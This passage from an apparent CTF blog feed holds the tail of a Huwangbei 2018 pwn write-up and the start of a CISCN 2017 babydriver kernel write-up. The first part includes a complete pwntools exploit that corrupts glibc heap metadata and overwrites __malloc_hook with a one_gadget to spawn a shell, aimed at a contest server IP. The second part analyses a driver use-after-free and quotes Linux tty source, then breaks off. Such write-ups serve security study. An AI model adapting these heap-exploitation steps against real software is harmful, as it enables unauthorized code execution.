class="number">0x20</span>)+p64(<span class="number">0x21</span>))*<span class="number">2</span>+<span class="string">'\n'</span> )</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#add(2,0x68)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br></pre></td></tr></table></figure><p>当前的unsorted bin 大小还是很大，由于限制不能分配出来，因此再次将unsorted bin size改成0x71，并且将bk改为__malloc_hook-0x10。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x71'</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x49</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+<span class="string">'a'</span>*<span class="number">8</span>+ p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span>)[:<span class="number">2</span>]  )</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br></pre></td></tr></table></figure><p>此时，__malloc_hook被写为main_arena+88，再次通过低字节写的方法，将其改为one_gadget，就可以拿到shell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">3</span>,<span class="number">0x15</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(libc_base+one_gadget[<span class="number">2</span>])[:<span class="number">3</span>])</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>剩下的事情就是爆破看RP了。。。</p><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">lib = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> lib==<span class="number">0</span>:</span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">offset = <span class="number">0x230</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">offset = <span class="number">0x260</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./task_calendar'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(bp = <span class="string">''</span>)</span>:</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">gdb.attach(p,bp)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(p1)</span>:</span></span><br><span class="line">f = open(<span class="string">'/proc/'</span>+str(pidof(p1)[<span class="number">0</span>])+<span class="string">'/maps'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">tmp = f.readline()</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'libc-2.23.so'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">libc_addr = int(<span class="string">'0x'</span>+tmp.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print hex((one_gadget[0]+libc_addr)&amp;0xffffff)</span></span><br><span class="line"><span class="comment">#if p64(((one_gadget[3]+libc_addr)&amp;0xffffff))[0:3] == (two_bytes+'\x00'):</span></span><br><span class="line"><span class="comment">#if ((one_gadget[0]+libc_addr)&amp;0xffffff)==0x66c4:</span></span><br><span class="line"><span class="comment">#print 'a'*1024</span></span><br><span class="line"><span class="comment">##gdb.attach(p)</span></span><br><span class="line"><span class="comment">#f1 = open('./result','w+')</span></span><br><span class="line"><span class="comment">#f1.write('1')</span></span><br><span class="line"><span class="comment">#f1.close()</span></span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] libc_addr :'</span>,hex(libc_addr)</span><br><span class="line"><span class="keyword">return</span> libc_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./task_calendar'</span> ,env=&#123;<span class="string">'LD_PRELOAD'</span> :libc_name&#125;)</span><br><span class="line"><span class="comment">#f = open('/proc/'+str(pidof(p)[0])+'/maps','r')</span></span><br><span class="line">libc_base = get_base(p)&amp;<span class="number">0xffffff</span></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote( <span class="string">'117.78.26.133'</span>, <span class="number">31666</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">libc_base = <span class="number">0xf64000</span> <span class="comment"># guess libc_base</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice&gt; '</span>)</span><br><span class="line">p.sendline(str(index + <span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">'size&gt; '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice&gt; '</span>)</span><br><span class="line">p.sendline(str(index + <span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">'size&gt; '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'info&gt; '</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice&gt; '</span>)</span><br><span class="line">p.sendline(str(index + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">z(<span class="string">'c\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input calendar name&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'p4nda'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#here we got a unsorted bin whose ptr in chunk1</span></span><br><span class="line"><span class="comment">#so, chunk 0,2,3 are useless</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>) <span class="comment"># first chunk of unsorted bin </span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>) <span class="comment"># second chunk of unsorted bin</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#change the original main_arena+88 to __malloc_hook-0x23</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)[:<span class="number">2</span>] ) </span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#change first fd to fake chunk pointed to __malloc_hook-0x23</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">1</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)  <span class="comment"># malloc_hook -0x23 is here</span></span><br><span class="line"><span class="comment">#repair fastbin</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">7</span>,p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># get an unsorted bin chunk first</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x67</span>,(p64(<span class="number">0x70</span>)+p64(<span class="number">0x20</span>))*<span class="number">4</span>+(p64(<span class="number">0x20</span>)+p64(<span class="number">0x21</span>))*<span class="number">2</span>+<span class="string">'\n'</span> )</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#add(2,0x68)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x71'</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x49</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+<span class="string">'a'</span>*<span class="number">8</span>+ p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span>)[:<span class="number">2</span>]  )</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x15</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(libc_base+one_gadget[<span class="number">2</span>])[:<span class="number">3</span>])</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      参加了护网杯CTF2018线上预选赛，队伍天枢获得第二名，记录一下本次比赛的全部PWN题
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>【kernel pwn】CISCN 2017 babydriver题解</title>
    <link href="http://p4nda.top/2018/10/11/ciscn-2017-babydriver/"/>
    <id>http://p4nda.top/2018/10/11/ciscn-2017-babydriver/</id>
    <published>2018-10-11T02:23:23.000Z</published>
    <updated>2018-10-11T09:08:14.867Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/17zezRnEgd2A-vAQ-U2IZyg" target="_blank" rel="noopener">题目及相关文件下载</a>，密码：3ryy</p><p>题目参考了<a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">Anciety</a>的这篇文章里讲述的方法，算是一种对于KERNEL PWN中UAF漏洞通用的提权方法。</p><p>本文参看代码linux-4.4.110源码，下载链接：<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.110.tar.gz" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.110.tar.gz</a></p><h1 id="Babydriver"><a href="#Babydriver" class="headerlink" title="Babydriver"></a>Babydriver</h1><h2 id="题目-amp-漏洞分析"><a href="#题目-amp-漏洞分析" class="headerlink" title="题目&amp;漏洞分析"></a>题目&amp;漏洞分析</h2><p>题目实现了babyopen、babyioctl、babyread、babywrite、babyrelease五个函数。</p><p>其中在babyopen中初始化了一个64字节的堆内存，并将这个内存地址和大小放在类似于BSS段的全局变量结构中存储。</p><p><img src="/img/babydriver/1.png" alt=""></p><p>在babyioctl中存在一个指令0x10001，这个指令可以重新制定堆块大小，将原有的内存释放，重新申请新的堆空间。</p><p><img src="/img/babydriver/2.png" alt=""></p><p>在babyread和babywrite中实现了常规的copy_from_user和copy_to_user，把堆块当做缓存，也限制了读取大小最多为babydev_struct.device_buf_len。</p><p>最后，在babyrelease中将释放申请的堆块。</p><p><img src="/img/babydriver/3.png" alt=""></p><p>该漏洞在于，内核的驱动仅加载一次。因此，驱动的全局变量是共享的，当同时打开多个文件时，babydev_struct.device_buf会被不断覆写，而在babyrelease时，会释放掉全部文件共享的缓冲区。而由于存在设置大小的函数，从而可以造成任意大小堆块的UAF漏洞。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="ptmx设备"><a href="#ptmx设备" class="headerlink" title="ptmx设备"></a>ptmx设备</h3><p>ptmx设备是tty设备的一种，当使用open函数打开时，通过系统调用进入内核，创建新的文件结构体，并执行驱动设备自实现的open函数。</p><p>具体open细节可以参考 ： <a href="https://blog.csdn.net/liushuimpc/article/details/51610941" target="_blank" rel="noopener">https://blog.csdn.net/liushuimpc/article/details/51610941</a></p><p>调试时，发现ptmx打开的函数调用路径如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► f 0 ffffffff81507e50 ptmx_open</span><br><span class="line">  f 1 ffffffff8120acbf chrdev_open+191</span><br><span class="line">  f 2 ffffffff81203e1f do_dentry_open+511</span><br><span class="line">  f 3 ffffffff812052f4 vfs_open+84</span><br><span class="line">  f 4 ffffffff81214587 path_openat+439</span><br><span class="line">  f 5 ffffffff81214587 path_openat+439</span><br><span class="line">  f 6 ffffffff812168f1 do_filp_open+145</span><br><span class="line">  f 7 ffffffff812056ca do_sys_open+314</span><br><span class="line">  f 8 ffffffff812057de sys_open+30</span><br><span class="line">  f 9 ffffffff812057de sys_open+30</span><br><span class="line">  f 10 ffffffff8183d259 entry_SYSCALL_64+137</span><br></pre></td></tr></table></figure><p>最终执行了ptmx_open函数，这个函数在<strong>\drivers\tty\pty.c 的734行</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ptmx_open</span><span class="params">(struct inode *inode, struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pts_fs_info</span> *<span class="title">fsi</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">slave_inode</span>;</span></span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"><span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">nonseekable_open(inode, filp);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We refuse fsnotify events on ptmx, since it's a shared resource */</span></span><br><span class="line">filp-&gt;f_mode |= FMODE_NONOTIFY;</span><br><span class="line"></span><br><span class="line">retval = tty_alloc_file(filp);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">fsi = devpts_get_ref(inode, filp);</span><br><span class="line">retval = -ENODEV;</span><br><span class="line"><span class="keyword">if</span> (!fsi)</span><br><span class="line"><span class="keyword">goto</span> out_free_file;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* find a device that is not in use. */</span></span><br><span class="line">mutex_lock(&amp;devpts_mutex);</span><br><span class="line">index = devpts_new_index(fsi);</span><br><span class="line">mutex_unlock(&amp;devpts_mutex);</span><br><span class="line"></span><br><span class="line">retval = index;</span><br><span class="line"><span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out_put_ref;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;tty_mutex);</span><br><span class="line">--&gt;tty = tty_init_dev(ptm_driver, index);</span><br><span class="line"><span class="comment">/* The tty returned here is locked so we can safely</span></span><br><span class="line"><span class="comment">   drop the mutex */</span></span><br><span class="line">mutex_unlock(&amp;tty_mutex);</span><br><span class="line"></span><br><span class="line">retval = PTR_ERR(tty);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tty))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * From here on out, the tty is "live", and the index and</span></span><br><span class="line"><span class="comment"> * fsi will be killed/put by the tty_release()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">set_bit(TTY_PTY_LOCK, &amp;tty-&gt;flags); <span class="comment">/* LOCK THE SLAVE */</span></span><br><span class="line">tty-&gt;driver_data = fsi;</span><br><span class="line"></span><br><span class="line">tty_add_file(tty, filp);</span><br><span class="line"></span><br><span class="line">slave_inode = devpts_pty_new(fsi,</span><br><span class="line">MKDEV(UNIX98_PTY_SLAVE_MAJOR, index), index,</span><br><span class="line">tty-&gt;link);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(slave_inode)) &#123;</span><br><span class="line">retval = PTR_ERR(slave_inode);</span><br><span class="line"><span class="keyword">goto</span> err_release;</span><br><span class="line">&#125;</span><br><span class="line">tty-&gt;link-&gt;driver_data = slave_inode;</span><br><span class="line"></span><br><span class="line">retval = ptm_driver-&gt;ops-&gt;open(tty, filp);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line"><span class="keyword">goto</span> err_release;</span><br><span class="line"></span><br><span class="line">tty_debug_hangup(tty, <span class="string">"(tty count=%d)\n"</span>, tty-&gt;count);</span><br><span class="line"></span><br><span class="line">tty_unlock(tty);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_release:</span><br><span class="line">tty_unlock(tty);</span><br><span class="line"><span class="comment">// This will also put-ref the fsi</span></span><br><span class="line">tty_release(inode, filp);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">out:</span><br><span class="line">devpts_kill_index(fsi, index);</span><br><span class="line">out_put_ref:</span><br><span class="line">devpts_put_ref(fsi);</span><br><span class="line">out_free_file:</span><br><span class="line">tty_free_file(filp);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关心的重点是在tty_struct这个堆空间是在哪里分配的，可以看到struct tty_struct *tty的赋值在767行 <strong><em>tty = tty_init_dev(ptm_driver, index);</em></strong>，该函数在<strong>\drivers\\tty\\tty_io.c 的1506行</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct tty_struct *<span class="title">tty_init_dev</span><span class="params">(struct tty_driver *driver, <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * First time open is complex, especially for PTY devices.</span></span><br><span class="line"><span class="comment"> * This code guarantees that either everything succeeds and the</span></span><br><span class="line"><span class="comment"> * TTY is ready for operation, or else the table slots are vacated</span></span><br><span class="line"><span class="comment"> * and the allocated memory released.  (Except that the termios</span></span><br><span class="line"><span class="comment"> * and locked termios may be retained.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(driver-&gt;owner))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENODEV);</span><br><span class="line"></span><br><span class="line">--&gt;tty = alloc_tty_struct(driver, idx);</span><br><span class="line"><span class="keyword">if</span> (!tty) &#123;</span><br><span class="line">retval = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err_module_put;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tty_lock(tty);</span><br><span class="line">retval = tty_driver_install_tty(driver, tty);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_deinit_tty;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!tty-&gt;port)</span><br><span class="line">tty-&gt;port = driver-&gt;ports[idx];</span><br><span class="line"></span><br><span class="line">WARN_RATELIMIT(!tty-&gt;port,</span><br><span class="line"><span class="string">"%s: %s driver does not set tty-&gt;port. This will crash the kernel later. Fix the driver!\n"</span>,</span><br><span class="line">__func__, tty-&gt;driver-&gt;name);</span><br><span class="line"></span><br><span class="line">tty-&gt;port-&gt;itty = tty;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Structures all installed ... call the ldisc open routines.</span></span><br><span class="line"><span class="comment"> * If we fail here just call release_tty to clean up.  No need</span></span><br><span class="line"><span class="comment"> * to decrement the use counts, as release_tty doesn't care.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">retval = tty_ldisc_setup(tty, tty-&gt;link);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line"><span class="keyword">goto</span> err_release_tty;</span><br><span class="line"><span class="comment">/* Return the tty locked so that it cannot vanish under the caller */</span></span><br><span class="line"><span class="keyword">return</span> tty;</span><br><span class="line"></span><br><span class="line">err_deinit_tty:</span><br><span class="line">tty_unlock(tty);</span><br><span class="line">deinitialize_tty_struct(tty);</span><br><span class="line">free_tty_struct(tty);</span><br><span class="line">err_module_put:</span><br><span class="line">module_put(driver-&gt;owner);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(retval);</span><br><span 